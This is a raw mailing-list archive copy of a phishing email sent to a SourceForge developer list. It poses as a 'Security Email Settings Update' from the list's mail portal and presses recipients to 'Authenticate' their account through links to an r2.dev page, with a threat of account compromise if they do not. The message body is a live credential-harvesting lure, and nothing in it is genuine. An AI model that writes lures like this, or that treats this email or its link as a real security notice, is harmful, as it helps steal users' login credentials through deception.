Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 88F889491AC
	for <lists+industrypack-devel@lfdr.de>; Tue,  6 Aug 2024 15:37:06 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-3.v29.lw.sourceforge.com)
	by sfs-ml-3.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1sbKN7-0002qt-Uc
	for lists+industrypack-devel@lfdr.de;
	Tue, 06 Aug 2024 13:37:05 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-3.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <maci@hxiso.com>) id 1sbKN6-0002qn-4L
 for industrypack-devel@lists.sourceforge.net;
 Tue, 06 Aug 2024 13:37:03 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=NuRmiHe0dkStZtJ13wJ8otoeJnBH9a5WyZMSY07brbM=; b=KWJc4R0bp3oys3qAW5dImM30sK
 vCvYu5X17G9eCRR7pCSTigIsEuugvYvLpPygCu94nKegmIleHcjmbc1o+BNbvehnu1T/oYH//8m8b
 uoE2vY4AGsudcmsJMqrjMGc4peBEt+uEjbbd3a0/e0h1PyoQ0ZIqK8ulvhZYqbvAWkKU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=NuRmiHe0dkStZtJ13wJ8otoeJnBH9a5WyZMSY07brbM=; b=C
 qq3cQV7zIMqkW6slGYZIOw9/18RfEaH6MxHHfvKpzZvxsA+YxSLgyxYMlPsVaokJiA2K9XrzuJnGX
 eG4nUy9H4i3jxNtDKzdbWAtsQP6APKxuDtauuwSxb+otmbOwuEGMtuv+x8pqVoFNm5F/zXa6jB6Lx
 CKbAfX2cTvEAukEk=;
Received: from light.hxiso.com ([193.25.216.139])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1sbKN4-0004IH-Lb for industrypack-devel@lists.sourceforge.net;
 Tue, 06 Aug 2024 13:37:03 +0000
DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=dkim; d=hxiso.com;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:Content-Transfer-Encoding;
 i=maci@hxiso.com; bh=RUC+DdLYV/+POR7oaZ3brPtGUKQ=;
 b=FFX5yZqzYKQVjijuSckNemAcX341ZHC+s5wQ1t920KwUH0tvdO1wD4x6g0mIjECJFfNfcPfA5CiJ
 bmVaRc4vDqxTRcdFFm9ClVSveXQOQwE1F1G5vv0/lY+AtYPkUVneHCLsVniBlJ99LcH/fVHkL26R
 2GFCYkiRwXnjARGyaf8/q4QPPg+kJvCN+USLrwUR1MpGLbqZM7xKPApg6xe75/M5HabX6nLTcU75
 oquqrjqEiVHV0S35T1u3J+JzDPEbPyZT0JrmlfeqawXVf6bFvAICCLwzon60ExflE9Rxo11hgJ3e
 1+UiLE0lAEYmKM2aeEViqzymQVBaytLmPIn0Yw==
DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=dkim; d=hxiso.com;
 b=QtnEdwcX5+kbR5OyGzSspJfh6qDthFP9idIoekLcCFu3XEcR6rntyUWLgNStWR4pBs0D7n98x5n4
 UzU4XRsCpIXCDskwR8SjZGEwsCUMpNKpGM3+XtRdGG3Ij1KrdXXJbDiu8I5yGWW1cjAv6V6c44bP
 1KcAjW5h2CrveImH9ZSS17+8etSDNJSkD4a1skWOi1XoLYFWHjt/wi3CgKD3kiseRZa3gA8r9XS3
 LKkiYlHclyjFzi+ydp7kJlFGmrgzS2ILem6K/OE9B7r8OBqNU0lpwylnkYTknftSHjiBZnrKOmIf
 ufeU2yn9P7HubHhAYZfuEKcBZcVU9xqJSHQlww==;
From: " Mail Online Service "<maci@hxiso.com>
To: industrypack-devel@lists.sourceforge.net
Date: 6 Aug 2024 08:36:49 -0500
Message-ID: <20240806083649.20663FF4CB82EA30@hxiso.com>
MIME-Version: 1.0
X-Spam-Score: 1.0 (+)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Security Email Settings Update. A Safe and Secure Email.
 Authenticate your email now Our Mail security system portal has requested
 for an automatic and safe mail account security settings Authentication on
 your eMail Server Portal. This security system Authentication is important
 for [...] 
 Content analysis details:   (1.0 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 0.0 URIBL_BLOCKED          ADMINISTRATOR NOTICE: The query to URIBL was
 blocked.  See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: r2.dev]
 -5.0 RCVD_IN_DNSWL_HI       RBL: Sender listed at https://www.dnswl.org/,
 high trust [193.25.216.139 listed in list.dnswl.org]
 1.0 FROMSPACE              Idiosyncratic "From" header format
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.1 URI_HEX                URI: URI hostname has long hexadecimal sequence
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid 5.0 RCVD_IN_MSPIKE_BL      Mailspike blocklisted
 0.0 RCVD_IN_MSPIKE_ZBI     No description available.
 0.0 FROM_MISSPACED         From: missing whitespace
X-Headers-End: 1sbKN4-0004IH-Lb
Subject: [Industrypack-devel] Ticket [#IGU-120-902647] : IMPORTANT : Fix
 Security issues on industrypack-devel@lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============4439393404495121538=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============4439393404495121538==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<table width=3D"600" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cont=
ainer" style=3D'border-width: 0px; margin: 0px auto; padding: 0px; width: 6=
00px; text-transform: none; letter-spacing: normal; font-family: "Helvetica=
 Neue", Helvetica, Arial, sans-serif; word-spacing: 0px; border-collapse: c=
ollapse; table-layout: fixed; outline-width: medium; outline-style: none; o=
rphans: 2; widows: 2; background-color: rgb(255, 255, 255); -webkit-text-st=
roke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;' cellspacin=
g=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium; outline-st=
yle: none;"><tr style=3D"outline-width: medium; outline-style: none;"><td s=
tyle=3D"outline-width: medium; outline-style: none;"></td></tr><tr style=3D=
"outline-width: medium; outline-style: none;"><td style=3D"outline-width: m=
edium; outline-style: none;"></td></tr><tr style=3D"outline-width: medium; =
outline-style: none;">
<td style=3D"outline-width: medium; outline-style: none;" bgcolor=3D"#6001d=
2"><table width=3D"600" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010m=
od-1" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; width: 60=
0px; border-collapse: collapse; outline-width: medium; outline-style: none;=
" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium=
; outline-style: none;"><tr style=3D"outline-width: medium; outline-style: =
none;">
<td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile4=
0" style=3D"line-height: 30px; font-size: 30px; outline-width: medium; outl=
ine-style: none;">&nbsp;</td></tr><tr style=3D"outline-width: medium; outli=
ne-style: none;"><td style=3D"outline-width: medium; outline-style: none;">=

<a style=3D"color: rgb(25, 106, 212); text-decoration: none; outline-width:=
 medium; outline-style: none;" href=3D"https://pub-c533ae88b49143c8b8a01b9d=
63c4f36b.r2.dev/ILoJJA77qtE7u1t.html#industrypack-devel@lists.sourceforge.n=
et" target=3D"_blank">
<table width=3D"550" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010inne=
r" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; width: 550px=
; border-collapse: collapse; outline-width: medium; outline-style: none;" c=
ellspacing=3D"0" cellpadding=3D"0">
<tbody style=3D"outline-width: medium; outline-style: none;"><tr style=3D"o=
utline-width: medium; outline-style: none;"><td class=3D"ydp3b4ada5fyiv2210=
188010copy ydp3b4ada5fyiv2210188010headline ydp3b4ada5fyiv2210188010center =
ydp3b4ada5fyiv2210188010white" style=3D"text-align: center; color: rgb(255,=
 255, 255); line-height: 40px; font-family: Helvetica, Arial, sans-serif; f=
ont-size: 36px; outline-width: medium; outline-style: none;">
<h1 style=3D"margin: 0px; line-height: 40px; font-size: 36px; font-weight: =
bold; outline-width: medium; outline-style: none;">Security Email Settings =
Update.<br style=3D"outline-width: medium; outline-style: none;">A&nbsp;Saf=
e and Secure Email.</h1></td></tr><tr style=3D"outline-width: medium; outli=
ne-style: none;"><td class=3D"ydp3b4ada5fyiv2210188010desktop" style=3D"lin=
e-height: 20px; font-size: 20px; outline-width: medium; outline-style: none=
;">&nbsp;</td></tr>
<tr style=3D"outline-width: medium; outline-style: none;"><td align=3D"cent=
er" class=3D"ydp3b4ada5fyiv2210188010desktop" valign=3D"top" style=3D"displ=
ay: block; outline-width: medium; outline-style: none;"><table width=3D"252=
" height=3D"49" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cta-butto=
n" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; border-colla=
pse: collapse; outline-width: medium; outline-style: none;"><tbody style=3D=
"outline-width: medium; outline-style: none;">
<tr style=3D"outline-width: medium; outline-style: none;"><td width=3D"244"=
 align=3D"center" style=3D"width: 248px; text-align: center; font-family: H=
elvetica, Arial, sans-serif; outline-width: medium; outline-style: none; ba=
ckground-color: rgb(1, 121, 255);"><span style=3D"text-align: center; color=
: rgb(255, 255, 255); line-height: 49px; font-family: Helvetica, Arial, san=
s-serif; font-size: 17px; font-weight: bold; text-decoration: none; outline=
-width: medium; outline-style: none;">
Authenticate your email now</span></td></tr></tbody></table></td></tr></tbo=
dy></table></a></td></tr><tr style=3D"outline-width: medium; outline-style:=
 none;"><td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv221018801=
0mobile40" style=3D"line-height: 30px; font-size: 30px; outline-width: medi=
um; outline-style: none;">&nbsp;</td></tr></tbody></table></td></tr><tr sty=
le=3D"outline-width: medium; outline-style: none;"></tr><tr style=3D"outlin=
e-width: medium; outline-style: none;">
<td style=3D"outline-width: medium; outline-style: none;"><table width=3D"6=
00" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010mod-2" style=3D"borde=
r-width: 0px; margin: 0px auto; padding: 0px; width: 600px; border-collapse=
: collapse; outline-width: medium; outline-style: none;" cellspacing=3D"0" =
cellpadding=3D"0"><tbody style=3D"outline-width: medium; outline-style: non=
e;"><tr style=3D"outline-width: medium; outline-style: none;">
<td class=3D"ydp3b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile4=
0" style=3D"line-height: 30px; font-size: 30px; outline-width: medium; outl=
ine-style: none;">&nbsp;</td></tr><tr height=3D"338" style=3D"outline-width=
: medium; outline-style: none;"><td style=3D"outline-width: medium; outline=
-style: none;">
<table width=3D"530" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010inne=
r" style=3D"border-width: 0px; margin: 0px auto; padding: 0px; width: 530px=
; border-collapse: collapse; outline-width: medium; outline-style: none;" c=
ellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"outline-width: medium; o=
utline-style: none;"><tr style=3D"outline-width: medium; outline-style: non=
e;">
<td class=3D"ydp3b4ada5fyiv2210188010copy ydp3b4ada5fyiv2210188010paragraph=
" style=3D"color: rgb(0, 0, 0); line-height: 27px; font-family: Helvetica, =
Arial, sans-serif; font-size: 18px; outline-width: medium; outline-style: n=
one;"><p style=3D"margin: 0px; outline-width: medium; outline-style: none;"=
>&nbsp;</p><p style=3D"margin: 0cm 0cm 0pt; text-align: justify; line-heigh=
t: 20.25pt;"><span style=3D"color: black; font-family: Helvetica, sans-seri=
f; font-size: 13.5pt;">
Our Mail security system portal has requested for an automatic and safe mai=
l account security settings Authentication on your eMail Server Portal. Thi=
s security system Authentication is important for the&nbsp;protection of yo=
ur email account. Please note that Failure to Authenticate your e-mail acco=
unt might lead to the compromise of your eMail Account and Server Portal.</=
span></p><p style=3D"margin: 0px; outline-width: medium; outline-style: non=
e;">&nbsp;</p></td></tr>
<tr style=3D"outline-width: medium; outline-style: none;"><td class=3D"ydp3=
b4ada5fyiv2210188010spacer ydp3b4ada5fyiv2210188010mobile40" style=3D"line-=
height: 30px; font-size: 30px; outline-width: medium; outline-style: none;"=
>&nbsp;</td></tr><tr style=3D"outline-width: medium; outline-style: none;">=
<td style=3D"outline-width: medium; outline-style: none;">
<table width=3D"200" align=3D"center" class=3D"ydp3b4ada5fyiv2210188010cta-=
button" style=3D"outline-width: medium; outline-style: none;" bgcolor=3D"#f=
fffff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody style=3D"out=
line-width: medium; outline-style: none;"><tr style=3D"outline-width: mediu=
m; outline-style: none;">
<td height=3D"50" align=3D"center" valign=3D"middle" style=3D"width: 200px;=
 text-align: center; color: rgb(0, 120, 255); line-height: 20px; font-famil=
y: Gotham-Medium-Multi, Arial, sans-serif; font-size: 17px; font-weight: no=
rmal; white-space: nowrap; outline-width: medium; outline-style: none;">
<a style=3D"border: 2px solid rgb(0, 120, 255); border-image: none; color: =
rgb(0, 120, 255); line-height: 45px; text-decoration: none; display: block;=
 white-space: nowrap; outline-width: medium; outline-style: none;" href=3D"=
https://pub-c533ae88b49143c8b8a01b9d63c4f36b.r2.dev/ILoJJA77qtE7u1t.html#in=
dustrypack-devel@lists.sourceforge.net" target=3D"_blank">Authenticate&nbsp=
;industrypack-devel@lists.sourceforge.net now</a></td></tr></tbody></table>=
<p>&nbsp;</p><p>
</p>
<hr style=3D"color: rgb(229, 229, 229); text-transform: none; text-indent: =
0px; letter-spacing: normal; overflow: visible; font-family: Roboto, sans-s=
erif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: =
0px; border-right-width: 0px; border-bottom-width: 0px; border-left-width: =
0px; border-top-style: solid; white-space: normal; min-height: 0px; orphans=
: 2; widows: 2;"><p></p>
<p style=3D"color: rgb(44, 54, 58); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: Roboto, sans-serif; font-size: 14px; =
font-style: normal; font-weight: 400; margin-top: 0px; word-spacing: 0px; w=
hite-space: normal; orphans: 2; widows: 2;"><span style=3D"font-size: 9pt;"=
>&copy;&nbsp;lists.sourceforge.net&nbsp;| All rights reserved.<br>This mess=
age was sent to industrypack-devel@lists.sourceforge.net.</span></p></td></=
tr></tbody></table></td></tr></tbody></table><p align=3D"center">
<font size=3D"2"><span style=3D"color: rgb(0, 0, 0); text-transform: none; =
text-indent: 0px; letter-spacing: normal; font-family: monospace; font-size=
: medium; font-style: normal; font-weight: 400; word-spacing: 0px; float: n=
one; display: inline; white-space: normal; box-sizing: border-box; orphans:=
 2; widows: 2;"></span></font>&nbsp;</p></td></tr></tbody></table></body></=
html>


--===============4439393404495121538==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============4439393404495121538==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============4439393404495121538==--
